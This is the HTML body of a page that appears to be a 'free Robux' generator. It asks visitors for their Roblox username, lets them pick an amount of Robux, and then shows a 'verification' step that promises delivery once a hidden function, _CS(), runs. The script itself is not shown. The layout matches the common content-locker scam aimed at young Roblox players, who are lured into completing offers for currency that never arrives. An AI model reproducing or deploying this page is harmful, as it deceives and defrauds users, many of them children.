  <body>
    <nav>
      <div class="logo">
        <span>&#9776;</span>
        <img
          alt="Logo"
          src="https://static.vecteezy.com/system/resources/previews/027/127/530/non_2x/roblox-logo-roblox-icon-transparent-free-png.png"
        />
      </div>
      <ul>
        <li>Charts</li>
        <li>Marketplace</li>
        <li>Robux</li>
      </ul>
    </nav>


    <div
      class="w-screen h-52 md:h-64 relative overflow-hidden shadow-lg mb-10 rounded-none"
    >
      <img
        alt="Banner"
        class="absolute inset-0 w-full h-full object-cover"
        src="https://i.imgur.com/pnKIeyU.jpg"
      />
      <div
        class="absolute inset-0 bg-black bg-opacity-40 flex items-center justify-center"
      >
        <h1 class="text-3xl md:text-5xl font-bold text-white text-center px-4">
          Roblox Username
        </h1>
      </div>
    </div>

    <div class="max-w-xl mx-auto py-10 px-6 text-center">
      <input
        class="w-full px-4 py-2 rounded-xl shadow-md mb-4 text-lg border border-gray-300"
        id="username"
        placeholder="Enter your Roblox username"
        type="text"
      />
      <button
        class="bg-[#272930] text-white px-6 py-2 rounded-xl hover:bg-gray-800 transition mb-6"
        id="search-button"
        onclick="fetchProfile()"
      >
        Search
      </button>

      <div class="hidden mt-6 text-center" id="profile">
        <img
          class="w-24 h-24 mx-auto rounded-full mb-2 shadow-md"
          id="avatar"
        />
        <p class="text-xl font-semibold" id="display-name"></p>
      </div>

      <div class="hidden mt-8" id="resource-section">
        <p class="block text-lg font-medium mb-4">Select robux amount</p>
        <div class="grid grid-cols-2 gap-4">
          <div
            class="resource-option cursor-pointer text-center p-4 rounded-xl shadow-md border border-gray-300 hover:bg-gray-100 transition"
            onclick="selectResource(this, 800)"
          >
            <img
              alt="800 Robux"
              class="w-8 h-8 mx-auto mb-2"
              src="https://tr.rbxcdn.com/97b15696b339e8afd80b39eaf955ada3/420/420/Image/Png"
            />
            <p class="text-xl font-semibold">800</p>
          </div>
          <div
            class="resource-option cursor-pointer text-center p-4 rounded-xl shadow-md border border-gray-300 hover:bg-gray-100 transition"
            onclick="selectResource(this, 1700)"
          >
            <img
              alt="1700 Robux"
              class="w-8 h-8 mx-auto mb-2"
              src="https://tr.rbxcdn.com/97b15696b339e8afd80b39eaf955ada3/420/420/Image/Png"
            />
            <p class="text-xl font-semibold">1,700</p>
          </div>
          <div
            class="resource-option cursor-pointer text-center p-4 rounded-xl shadow-md border border-gray-300 hover:bg-gray-100 transition"
            onclick="selectResource(this, 4500)"
          >
            <img
              alt="4500 Robux"
              class="w-8 h-8 mx-auto mb-2"
              src="https://tr.rbxcdn.com/97b15696b339e8afd80b39eaf955ada3/420/420/Image/Png"
            />
            <p class="text-xl font-semibold">4,500</p>
          </div>
          <div
            class="resource-option cursor-pointer text-center p-4 rounded-xl shadow-md border border-gray-300 hover:bg-gray-100 transition"
            onclick="selectResource(this, 10000)"
          >
            <img
              alt="10000 Robux"
              class="w-8 h-8 mx-auto mb-2"
              src="https://tr.rbxcdn.com/97b15696b339e8afd80b39eaf955ada3/420/420/Image/Png"
            />
            <p class="text-xl font-semibold">10,000</p>
          </div>
        </div>
        <div class="flex justify-center mt-6">
          <button
            class="hidden bg-green-600 text-white px-6 py-2 rounded-xl hover:bg-green-700 transition"
            id="confirm-button"
            onclick="confirmSelection()"
          >
            Confirm
          </button>
        </div>
      </div>
    </div>
    <div
      class="hidden my-6 flex items-center justify-center flex-col relative"
      id="loading-spinner"
    >
      <!-- Effet sonar derriÃ¨re -->
      <div
        class="absolute animate-sonar w-20 h-20 rounded-full bg-gray-400/20"
      ></div>
      <!-- Loupe en mouvement circulaire -->
      <svg
        class="relative h-12 w-12 text-gray-600 animate-loupe-orbit-glow z-10"
        fill="none"
        viewBox="0 0 24 24"
        xmlns="http://www.w3.org/2000/svg"
      >
        <path
          d="M21 21l-4.35-4.35M10.5 18a7.5 7.5 0 100-15 7.5 7.5 0 000 15z"
          stroke="currentColor"
          stroke-linecap="round"
          stroke-linejoin="round"
          stroke-width="2"
        ></path>
      </svg>

      <!-- Texte sous la loupe -->
      <span class="mt-2 text-gray-600 text-sm animate-pulse z-10"
        >Searching profile...
      </span>
    </div>
    <!-- Loading Overlay -->
    <div
      class="hidden fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center z-50"
      id="loading-overlay"
    >
      <div class="text-center">
        <div
          class="w-16 h-16 border-4 border-white border-dashed rounded-full animate-spin mx-auto mb-4"
        ></div>
        <p class="text-white text-xl font-semibold animate-pulse">Loading...</p>
      </div>
    </div>

    <!-- Error Modal -->
    <div
      class="hidden fixed inset-0 z-50 flex items-center justify-center bg-black bg-opacity-50"
      id="error-modal"
    >
      <div class="bg-white p-6 rounded-2xl shadow-xl max-w-sm text-center">
        <p class="text-red-600 font-semibold mb-4" id="error-modal-text">
          Error
        </p>
        <button
          class="bg-red-500 text-white px-4 py-2 rounded-xl hover:bg-red-600 transition"
          onclick="closeErrorModal()"
        >
          Close
        </button>
      </div>
    </div>

    <!-- Verification Step -->
    <div
      class="hidden fixed inset-0 z-50 flex items-center justify-center bg-black bg-opacity-50"
      id="verify-step"
    >
      <div
        class="bg-white p-6 rounded-2xl shadow-xl max-w-sm text-center animate-fade-in"
      >
        <p class="text-lg font-medium mb-4">
          Complete the verification to receive your robux.
        </p>
        <button
          class="bg-[#272930] text-white px-4 py-2 rounded-xl hover:bg-gray-800 transition"
          onclick="_CS()"
        >
          Verify
        </button>
      </div>
    </div>
